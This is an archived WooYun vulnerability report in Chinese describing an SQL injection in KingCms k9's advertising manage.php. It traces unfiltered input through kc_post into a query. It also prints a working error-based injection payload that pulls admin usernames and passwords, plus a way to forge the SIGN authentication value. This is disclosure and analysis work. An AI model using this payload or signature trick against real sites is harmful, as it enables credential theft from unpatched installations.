{"id": 36797, "wybug_id": "wooyun-2015-0101068", "wybug_title": "KingCms最新版（k9）注入一枚#7", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-13 12:16", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）注入一枚 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9(2014-12-13更新)，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 注入点：GET /apps/advertising/manage.php?jsoncallback=1&_=1&CMD=edt&AJAX=1&USERID=10000&SIGN=89ee81f5f1f328f555ceb7e7655d9f2f&type=1'/**/UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),CONCAT(0x23,(SELECT/**/concat(username,0x23,userpass)FROM/**/king_user/**/LIMIT/**/0,1),0x23,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.tables/**/GROUP/**/BY/**/x)a%23 HTTP/1.1注入参数：type 问题文件在/apps/advertising/manage.php\nfunction _edt(){\t$u=new user;\tif (!$u->auth_role('advertising_edit',true)) kc_tip('您无权编辑广告');\t\t$db=new db;\t$str=new str;\t$id=kc_post('id',2);\t$data=array();\t$time=time();\t$type=kc_post('type');\t$today=$str->formatDate($time,'Ymd');\t//$config=require ROOT.'apps/advertising/include/config.php';\t//$config=require ROOT.T.'advertising/include/config.php';\tif (METHOD=='GET') {\t\t//添加的时候初始化数据\t\tif (empty($id)) {\t\t\t$rs=$db->getRows_one('%s_advertising','edate',\"type='$type' and status=1\",'edate desc');\t\t\tif(empty($rs)){\t\t\t\t$data['sdate']=$today;\t\t\t\t$data['edate']=$str->formatDate($time+86400*31,'Ymd');\t\t\t}else{\t\t\t\t$data['sdate']=$rs['edate']>$today ? $str->formatDate(strtotime($rs['edate'])+86400,'Ymd') : $today;\t\t\t\t$data['edate']=$str->formatDate(strtotime($data['sdate'])+86400*30,'Ymd');\t\t\t}\t\t\t$data['cdate']=$str->formatDate(time(),'Ymd');\t\t\t\t\t\t$data['status']=1;\t\t\t$data['price']=100;\t\t\t$data['src']='/banner/';\t\t}else{\t\t\t$data=$db->getRows_one('%s_advertising','*','id='.$id);\t\t\t$type=$data['type'];\t\t}\t}\n这里有个if判断if (!$u->auth_role('advertising_edit',true))，只要使GET[‘SIGN’]为下面的SIGN即可。\n<?php$str=\"10000\";//10000即GET参数中的USERID$str.=\"kingcms.com\";$SIGN=md5($str);?>\n$type是这样获得的$type=kc_post('type');，去看看kc_post()\nfunction kc_post($name,$type=0,$is=0){\t//判断是否为通过admin平台传递来的值//\tif(empty($_GET['jsoncallback'])){\t$post = isset($_POST[$name]) ? $_POST[$name] : false;//\t}else{//\t\t$post=isset($_GET[$name]) ? $_GET[$name] : false;//\t}\tif(!empty($post)){//如果有值，则判断类型\t\tif(!kc_validate($post,$type)){\t\t\tkc_tip('POST参数 '.$name.' 数据类型不正确');\t\t}\t}\tif($is && $post===false){//要求有值的时候判断\t\tkc_tip('POST参数 '.$name.' 不能为空');\t}\treturn $post;}\n可以看到利用kc_validate($post,$type)来对数据进行过滤，但是当kc_validate($post,$type)的第二个参数$type默认值时，则不会过滤，这里在使用kc_validate($post,$type)时，第二个参数就是使用的默认值，也即这里没有过滤。一直到进行数据库都未过滤，执行了$rs=$db->getRows_one('%s_advertising','edate',\"type='$type' and status=1\",'edate desc');造成了注入。Kingcms可以报错，因此Payload：\ntype=1'/**/UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),CONCAT(0x23,(SELECT/**/concat(username,0x23,userpass)FROM/**/king_user/**/LIMIT/**/0,1),0x23,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.tables/**/GROUP/**/BY/**/x)a%23\n注入成功，见下图\n\n   漏洞证明：  见 详细说明   修复方案：  过滤    版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}